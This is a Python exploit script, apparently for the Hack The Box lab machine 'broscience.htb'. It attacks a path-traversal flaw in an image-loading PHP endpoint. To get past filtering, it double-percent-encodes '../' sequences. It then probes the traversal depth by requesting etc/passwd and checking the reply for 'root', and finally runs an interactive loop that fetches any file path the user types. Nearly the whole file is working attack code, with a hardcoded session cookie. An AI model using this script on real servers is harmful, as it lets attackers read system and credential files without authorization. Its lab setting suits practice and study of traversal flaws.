import requests
import urllib

requests.packages.urllib3.disable_warnings()

url = 'https://broscience.htb/includes/img.php?path='

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cookie': 'PHPSESSID=gsufisuk1aun12fv5du218cog3',
}


def percent_encode(s):
    return s.replace('%', '%25').replace('/', '%2F')


def double_percent_encode(s):
    return percent_encode(percent_encode(s))


def cstr(c, s, b=False):
    cs = {'red': '31', 'green': '32', 'yellow': '33', 'blue': '34',
        'magenta': '35', 'cyan': '36','white': '37', 'black': '30',
        'orange': '38;5;208', 'purple': '38;5;141', 'pink': '38;5;217'}
    b = '1;' if b else ''  

    return f'\033[{b}{cs[c]}m{s}\033[0m'


def yn(s):
    while True:
        yn = input(s + ' [y/n]: ').lower() 
        if yn == 'y':
            return True
        elif yn == 'n':
            return False        


def print_response(res):
    headers = res.headers
    content_type = headers.get('Content-Type')
    rl = len(res.text)

    if rl == 0:
        print(cstr('orange', '[RESPONSE]: ') + 'empty response')
        return

    if not content_type:
        print(cstr('orange', '[RESPONSE]: \n') + res.text[:240])
        return

    if rl > 1000:
        full = yn(cstr('white', f'[DEBUG]: response size = {rl}. Print anyway?', b=True))
        if full:
            print(cstr('white', '[RESPONSE]: \n') + res.text)
            return

    print(cstr('white', '[RESPONSE]: \n') + res.text[:1000])
    return

    

def manual_fetch(depth=None):
    path = input(cstr('green', '[PATH]: '))
    d_enc_path = double_percent_encode(path)
    print(cstr('green', '[DEBUG]: ') + d_enc_path)
    try:
        res = requests.request(
            'GET', 
            url+d_enc_path, 
            headers=headers,
            verify=False)

        res.raise_for_status()
        print_response(res)
    except Exception as e:
        print(cstr('red', '[ERROR]: ') + str(e))


def detect_depth():
    depth = 0
    etchosts = 'etc/passwd'
    suffix = '../'
    retries = 0

    while True:
        try:
            if depth == 0:
                path = '/' + etchosts
            else:
                path = suffix * depth + etchosts
            print(cstr('white', '[INFO]: ') + 'Trying depth: ' + str(depth))
            print(cstr('white', '[PAYLOAD]: ') + cstr('yellow', path))
            if depth > 15:
                print(cstr('red', '[ERROR] : ') + 'Too deep')
                return 

            d_enc_path = double_percent_encode(path)
            res = requests.request(
                'GET', 
                url + d_enc_path, 
                headers=headers,
                verify=False)
            
            res.raise_for_status()

            retries = 0
            depth += 1
            if 'root' in res.text:
                print(cstr('green', '[INFO]: ')+'Depth detected = '+str(depth-1))
                return depth-1
        
        except Exception as e:
            print(cstr('red', '[ERROR]: ') + str(e))
            retries += 1
            if retries > 3:
                print(cstr('red', '[ERROR]: ') + 'Too many retries')
                return    

CLI_MAP = {
    'manual': manual_fetch,
    'depth': detect_depth
}

def _exit(success):
    if success:
        print(cstr('green', '[SUCCESS]: ') + 'Exiting...')
    else:
        print(cstr('red', '[ERROR]: ') + 'Exiting...')

def run():
    mode = 'manual' 
    depth = detect_depth()
    if not depth:
        _exit()
    

    while True:
        CLI_MAP[mode](depth)

if __name__ == '__main__':
    run()
